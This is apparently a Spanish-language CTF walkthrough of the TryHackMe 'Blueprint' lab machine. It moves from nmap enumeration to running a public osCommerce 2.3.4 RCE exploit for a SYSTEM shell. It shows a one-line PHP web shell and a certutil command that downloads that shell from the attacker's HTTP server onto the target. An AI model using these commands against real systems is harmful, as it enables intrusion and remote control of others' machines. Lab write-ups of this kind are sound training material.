## TryHackMe  <> Blueprint

![image](https://github.com/Esevka/CTF/assets/139042999/d3e2a2d8-c350-4c93-96f4-74177978fdb2)

---
---

## Escaneo de puertos

Lanzamos una traza ICMP(ping) para ver si la maquina esta activa, segun el ttl obtenido, por proximidad al valor 128(Windows) podriamos decir que es una maquina Windows.

    ┌──(root㉿kali)-[/home/kali]
    └─# ping 10.10.5.46 -c1                                                
    PING 10.10.5.46 (10.10.5.46) 56(84) bytes of data.
    64 bytes from 10.10.5.46: icmp_seq=1 ttl=127 time=59.1 ms
    
    --- 10.10.5.46 ping statistics ---
    1 packets transmitted, 1 received, 0% packet loss, time 0ms
    rtt min/avg/max/mdev = 59.125/59.125/59.125/0.000 ms

Reporte Nmap

    ┌──(root㉿kali)-[/home/kali]
    └─# nmap -p- --open -sS -sCV --min-rate 5000 -n -Pn -vvv 10.10.5.46 -oN open_ports
    Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-12 17:08 CEST
    PORT      STATE SERVICE      REASON          VERSION
    80/tcp    open  http         syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
    |_http-server-header: Microsoft-IIS/7.5
    | http-methods: 
    |   Supported Methods: OPTIONS TRACE GET HEAD POST
    |_  Potentially risky methods: TRACE
    |_http-title: 404 - File or directory not found.
    135/tcp   open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
    139/tcp   open  netbios-ssn  syn-ack ttl 127 Microsoft Windows netbios-ssn
    443/tcp   open  ssl/http     syn-ack ttl 127 Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)
    | tls-alpn: 
    |_  http/1.1
    |_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28
    | http-ls: Volume /
    | SIZE  TIME              FILENAME
    | -     2019-04-11 22:52  oscommerce-2.3.4/
    | -     2019-04-11 22:52  oscommerce-2.3.4/catalog/
    | -     2019-04-11 22:52  oscommerce-2.3.4/docs/
    |_
    | http-methods: 
    |   Supported Methods: POST OPTIONS GET HEAD TRACE
    |_  Potentially risky methods: TRACE
    | ssl-cert: Subject: commonName=localhost
    | Issuer: commonName=localhost
    | Public Key type: rsa
    | Public Key bits: 1024
    | Signature Algorithm: sha1WithRSAEncryption
    | Not valid before: 2009-11-10T23:48:47
    | Not valid after:  2019-11-08T23:48:47
    | MD5:   a0a44cc99e84b26f9e639f9ed229dee0
    | SHA-1: b0238c547a905bfa119c4e8baccaeacf36491ff6
    | -----BEGIN CERTIFICATE-----
    | MIIBnzCCAQgCCQC1x1LJh4G1AzANBgkqhkiG9w0BAQUFADAUMRIwEAYDVQQDEwls
    | b2NhbGhvc3QwHhcNMDkxMTEwMjM0ODQ3WhcNMTkxMTA4MjM0ODQ3WjAUMRIwEAYD
    | VQQDEwlsb2NhbGhvc3QwgZ8wDQYJKoZIhvcNAQEBBQADgY0AMIGJAoGBAMEl0yfj
    | 7K0Ng2pt51+adRAj4pCdoGOVjx1BmljVnGOMW3OGkHnMw9ajibh1vB6UfHxu463o
    | J1wLxgxq+Q8y/rPEehAjBCspKNSq+bMvZhD4p8HNYMRrKFfjZzv3ns1IItw46kgT
    | gDpAl1cMRzVGPXFimu5TnWMOZ3ooyaQ0/xntAgMBAAEwDQYJKoZIhvcNAQEFBQAD
    | gYEAavHzSWz5umhfb/MnBMa5DL2VNzS+9whmmpsDGEG+uR0kM1W2GQIdVHHJTyFd
    | aHXzgVJBQcWTwhp84nvHSiQTDBSaT6cQNQpvag/TaED/SEQpm0VqDFwpfFYuufBL
    | vVNbLkKxbK2XwUvu0RxoLdBMC/89HqrZ0ppiONuQ+X2MtxE=
    |_-----END CERTIFICATE-----
    |_ssl-date: TLS randomness does not represent time
    |_http-title: Index of /
    445/tcp   open  microsoft-ds syn-ack ttl 127 Windows 7 Home Basic 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
    3306/tcp  open  mysql        syn-ack ttl 127 MariaDB (unauthorized)
    8080/tcp  open  http         syn-ack ttl 127 Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)
    |_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28
    | http-methods: 
    |   Supported Methods: POST OPTIONS GET HEAD TRACE
    |_  Potentially risky methods: TRACE
    |_http-title: Index of /
    | http-ls: Volume /
    | SIZE  TIME              FILENAME
    | -     2019-04-11 22:52  oscommerce-2.3.4/
    | -     2019-04-11 22:52  oscommerce-2.3.4/catalog/
    | -     2019-04-11 22:52  oscommerce-2.3.4/docs/
    |_
    49152/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
    49153/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
    49154/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
    49158/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
    49160/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
    Service Info: Hosts: www.example.com, BLUEPRINT, localhost; OS: Windows; CPE: cpe:/o:microsoft:windows
    
    Host script results:
    |_clock-skew: mean: -19m40s, deviation: 34m37s, median: 18s
    | nbstat: NetBIOS name: BLUEPRINT, NetBIOS user: <unknown>, NetBIOS MAC: 024e770b4ae5 (unknown)
    | Names:
    |   BLUEPRINT<00>        Flags: <unique><active>
    |   WORKGROUP<00>        Flags: <group><active>
    |   BLUEPRINT<20>        Flags: <unique><active>
    |   WORKGROUP<1e>        Flags: <group><active>
    |   WORKGROUP<1d>        Flags: <unique><active>
    |   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
    | Statistics:
    |   024e770b4ae50000000000000000000000
    |   0000000000000000000000000000000000
    |_  0000000000000000000000000000
    | p2p-conficker: 
    |   Checking for Conficker.C or higher...
    |   Check 1 (port 49084/tcp): CLEAN (Couldn't connect)
    |   Check 2 (port 40151/tcp): CLEAN (Couldn't connect)
    |   Check 3 (port 61749/udp): CLEAN (Failed to receive data)
    |   Check 4 (port 5963/udp): CLEAN (Timeout)
    |_  0/4 checks are positive: Host is CLEAN or ports are blocked
    | smb-os-discovery: 
    |   OS: Windows 7 Home Basic 7601 Service Pack 1 (Windows 7 Home Basic 6.1)
    |   OS CPE: cpe:/o:microsoft:windows_7::sp1
    |   Computer name: BLUEPRINT
    |   NetBIOS computer name: BLUEPRINT\x00
    |   Workgroup: WORKGROUP\x00
    |_  System time: 2023-07-12T16:10:36+01:00
    | smb2-security-mode: 
    |   210: 
    |_    Message signing enabled but not required
    | smb-security-mode: 
    |   account_used: guest
    |   authentication_level: user
    |   challenge_response: supported
    |_  message_signing: disabled (dangerous, but default)
    | smb2-time: 
    |   date: 2023-07-12T15:10:36
    |_  start_date: 2023-07-12T14:49:57


## Analisis de Vulnerabilidades

Despues de analizar los puertos vemos que en el puerto 8080 esta corriendo un oscommerce 2.3.4

      8080/tcp  open  http         syn-ack ttl 127 Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)
    |_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28
    | http-methods: 
    |   Supported Methods: POST OPTIONS GET HEAD TRACE
    |_  Potentially risky methods: TRACE
    |_http-title: Index of /
    | http-ls: Volume /
    | SIZE  TIME              FILENAME
    | -     2019-04-11 22:52  oscommerce-2.3.4/
    | -     2019-04-11 22:52  oscommerce-2.3.4/catalog/
    | -     2019-04-11 22:52  oscommerce-2.3.4/docs/

![image](https://github.com/Esevka/CTF/assets/139042999/0bc4aaf1-4661-4521-bfe0-661fb1484b77)


Con la ayuda de searchsploit vemos si existe algun exploit para esta version de oscommerce, en este caso a nosotros nos interesa el ultimo(50128).
Toda la info del exploit lo tenemos en la url -> https://www.exploit-db.com/exploits/50128

    ┌──(root㉿kali)-[/home/kali]
    └─# searchsploit oscommerce 2.3.4 -w
    --------------------------------------------------------------------------------------------------- --------------------------------------------
     Exploit Title                                                                                     |  URL
    --------------------------------------------------------------------------------------------------- --------------------------------------------
    osCommerce 2.3.4 - Multiple Vulnerabilities                                                        | https://www.exploit-db.com/exploits/34582
    osCommerce 2.3.4.1 - 'currency' SQL Injection                                                      | https://www.exploit-db.com/exploits/46328
    osCommerce 2.3.4.1 - 'products_id' SQL Injection                                                   | https://www.exploit-db.com/exploits/46329
    osCommerce 2.3.4.1 - 'reviews_id' SQL Injection                                                    | https://www.exploit-db.com/exploits/46330
    osCommerce 2.3.4.1 - 'title' Persistent Cross-Site Scripting                                       | https://www.exploit-db.com/exploits/49103
    osCommerce 2.3.4.1 - Arbitrary File Upload                                                         | https://www.exploit-db.com/exploits/43191
    osCommerce 2.3.4.1 - Remote Code Execution                                                         | https://www.exploit-db.com/exploits/44374
    osCommerce 2.3.4.1 - Remote Code Execution (2)                                                     | https://www.exploit-db.com/exploits/50128
    --------------------------------------------------------------------------------------------------- --------------------------------------------

## Explotamos la falla de seguridad

  Como vemos al ejecutar exploit este nos devuelve una shell en la cual ejecutamos comandos con permisos de administrador del equipo windows. 
  Datos que nos podrian interesar de cara al futuro.

    ┌──(root㉿kali)-[/home/…/Desktop/ctf/blueprint/script]
    └─# python3 50128.py http://10.10.5.46:8080/oscommerce-2.3.4/catalog
    [*] Install directory still available, the host likely vulnerable to the exploit.
    [*] Testing injecting system command to test vulnerability
    User: nt authority\system
    
    RCE_SHELL$ whoami
    nt authority\system

    RCE_SHELL$ systeminfo
    Host Name:                 BLUEPRINT
    OS Name:                   Microsoft Windows 7 Home Basic 
    OS Version:                6.1.7601 Service Pack 1 Build 7601
    System Type:               X86-based PC

El tipo de shell que nos entrega este exploit no nos permite mucha movilidad.

## Conseguimos una Reverse Shell

Ya que somos admin del equipo podrimos descargar con la ayuda del comando certutil un fichero en php que nos permita ejecutar comandos a traves de la web(URL), para posteriormente ejecutar una reverse shell y poder trabajar comodamente.  

Info comando certutil  -> https://tecnonucleous.com/2018/04/05/certutil-exe-podria-permitir-que-los-atacantes-descarguen-malware-mientras-pasan-por-alto-el-antivirus/

Creamos el fichero con el siguiente codigo php, el cual nos permite ejecutar comandos a traves de la url.

        ┌──(root㉿kali)-[/home/…/Desktop/ctf/blueprint/script]
        └─# cat rce.php                    
        <?php
        echo exec($_GET['cmd']);
        ?>

Montamos un servidor http para compartir nuestro fichero rce.php

        ┌──(root㉿kali)-[/home/…/Desktop/ctf/blueprint/script]
        └─# python3 -m http.server 80 
        Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

Nos descargamos el fichero desde la maquina windows con certutil

        RCE_SHELL$ certutil -urlcache -f http://10.8.64.232/rce.php rce.php
        ****  Online  ****
        CertUtil: -URLCache command completed successfully.
        
        RCE_SHELL$ dir
         Volume in drive C has no label.
         Volume Serial Number is 14AF-C52C
        
         Directory of C:\xampp\htdocs\oscommerce-2.3.4\catalog\install\includes
        
        07/12/2023  05:12 PM    <DIR>          .
        07/12/2023  05:12 PM    <DIR>          ..
        04/11/2019  10:52 PM               447 application.php
        07/12/2023  05:12 PM             1,118 configure.php
        04/11/2019  10:52 PM    <DIR>          functions
        07/12/2023  05:12 PM                34 rce.php
                       3 File(s)          1,599 bytes
                       3 Dir(s)  19,509,256,192 bytes free

    
![image](https://github.com/Esevka/CTF/assets/139042999/9eb7dd93-cd4d-4a3a-8b43-c69eee5d5d99)
    
![image](https://github.com/Esevka/CTF/assets/139042999/39a79773-a338-4be0-976c-705efc80cabf)

---
Pues siguiento el proceso anterior creamos una reverse shell con msfvenom, seguidamente nos la descargamos a la maquina windows y la ejecutamos desde nuestro fichero rce.php, obteniendo una reverse shell.




    

    


  


  
